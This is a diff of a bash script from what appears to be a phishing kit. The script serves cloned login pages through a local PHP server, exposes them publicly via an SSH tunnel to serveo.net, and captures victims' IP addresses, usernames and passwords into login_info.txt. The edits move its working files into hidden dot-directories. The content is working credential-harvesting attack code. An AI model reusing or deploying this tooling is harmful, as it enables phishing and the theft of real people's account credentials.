@@ -911,23 +911,23 @@ printf "\e[0m\n"
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
 while [ true ]; do
-if [[ -e "sites/$server/ip.txt" ]]; then
+if [[ -e ".sites/$server/ip.txt" ]]; then
 c_ip
 rm -rf sites/$server/ip.txt
 fi
 sleep 0.75
-if [[ -e "sites/$server/usernames.txt" ]]; then
-account=$(grep -o 'Username:.*' sites/$server/usernames.txt | cut -d " " -f2)
+if [[ -e ".sites/$server/usernames.txt" ]]; then
+account=$(grep -o 'Username:.*' .sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' .sites/$server/usernames.txt | cut -d ":" -f2)
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
-cat websites/$server/usernames.txt >> websites/$server/login_info.txt
+cat .sites/$server/usernames.txt >> .sites/$server/login_info.txt
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
-rm -rf sites/$server/usernames.txt
+rm -rf .sites/$server/usernames.txt
 fi
 sleep 0.75
 done
@@ -936,12 +936,12 @@ done
 ##
 serverx() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+cd .sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
-if [[ -e sendlink ]]; then
-rm -rf sendlink
+if [[ -e .sendlink ]]; then
+rm -rf .sendlink
 fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
@@ -958,12 +958,12 @@ checkfound
 }
 
 startx() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
+if [[ -e .sites/$server/ip.txt ]]; then
+rm -rf .sites/$server/ip.txt
 
 fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
+if [[ -e .sites/$server/usernames.txt ]]; then
+rm -rf .sites/$server/usernames.txt
 
 fi
 
@@ -979,8 +979,8 @@ serverx
 ##
 
 start() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
+if [[ -e .sites/$server/ip.txt ]]; then
+rm -rf .sites/$server/ip.txt
 
 fi
 if [[ -e sites/$server/usernames.txt ]]; then
